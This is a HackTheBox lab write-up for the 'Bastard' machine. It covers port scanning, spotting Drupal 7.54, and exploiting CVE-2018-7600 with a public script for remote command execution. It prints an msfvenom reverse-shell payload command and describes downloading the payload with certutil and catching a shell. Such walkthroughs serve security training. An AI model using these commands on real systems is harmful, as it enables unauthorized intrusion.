# HackTheBox: Bastard
https://www.hackthebox.com/machines/bastard

## 1. Enumeration
### 1.1. port scanning
Scan the ports of the target machine
```sudo nmap -T 4 -p- -A X.X.X.X ```

<img width="1909" height="651" alt="image" src="https://github.com/user-attachments/assets/8885c3de-0d87-4e7d-beac-67668e85dac7" />

As observed in above screenshot, open ports discovered are 80, 135 and 49154.

### 1.2. web subdirectory enumeration on Port 80 (HTTP)
Checking out the HTTP service on port 80, the landing page is a login panel as below.
<img width="1593" height="641" alt="image" src="https://github.com/user-attachments/assets/b3f45e91-454b-4051-9272-4f8753c927c9" />


From the earlier nmap scan, noticed a few subdirectories had been found such as CHANGELOG.txt.

<img width="957" height="862" alt="image" src="https://github.com/user-attachments/assets/8563b079-4925-4d94-b04c-eefeac2c2fc3" />

At *http://X.X.X.X:80/CHANGELOG.txt*, the file here revealed that the web service could be running on Drupal 7.54 which is open-source content management system (CMS).

## 2. Exploitation

### 2.1. researching vulnerability
Online researching *Drupal 7.54* :
- Found possible vulnerability CVE-2018-7600 (https://nvd.nist.gov/vuln/detail/cve-2018-7600) that allows remote attackers to execute arbitrary code.
- Found a publicly available exploit (https://github.com/pimps/CVE-2018-7600)

### 2.2. exploiting vulnerability
Hence we downloaded the exploit (python script) and execute it against the target server where remote commands can be executed with the parameter for ```-c``` switch.
For example ```python3 drupa7-CVE-2018-7600.py http://X.X.X.X:80 -c "systeminfo"``` to run ```systeminfo``` command

<img width="761" height="834" alt="image" src="https://github.com/user-attachments/assets/bc4f6011-b821-4b52-b205-a3bd900a66bc" />

A reverse shell payload can be planted to get a direct foothold on the server.

First, as per below screenshot, generate the payload using ```msfvenom``` by running the command ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=5555 -f exe > shell.exe``` where the X.X.X.X represents the attacker's IP and 5555 is the listening port.
Then serve the payload via http using ```python -m http.server 8000```
<img width="892" height="198" alt="image" src="https://github.com/user-attachments/assets/b89c7118-72ff-4df4-bd4d-0d2d10774b79" />

Secondly, as per below screenshot, using a remote command execution, use *certutil* to download the payload *shell.exe* onto the target machine.
<img width="1115" height="247" alt="image" src="https://github.com/user-attachments/assets/40892f4d-fbcb-40ea-ab50-ff43594e1b24" />

Thirdly, verify that the payload *shell.exe* is on the target machine.

<img width="766" height="821" alt="image" src="https://github.com/user-attachments/assets/4a31bae6-ae11-44ee-ad32-89bacc82b96e" />


Then on attacker machine, start a listener on port 5555: <br/>
<img width="405" height="154" alt="image" src="https://github.com/user-attachments/assets/1d8258d3-f8eb-4f0c-a984-b3fb4c261480" />


Execute the payload using remote command.
<img width="719" height="242" alt="image" src="https://github.com/user-attachments/assets/b4a4564a-d06a-494d-9409-bf2d51b4382d" />

A reverse shell has been caught on the attacker's machine and thus giving an initial foothold.
<img width="715" height="247" alt="image" src="https://github.com/user-attachments/assets/3b68c5ba-dc81-4100-9194-661dd205c3ae" />







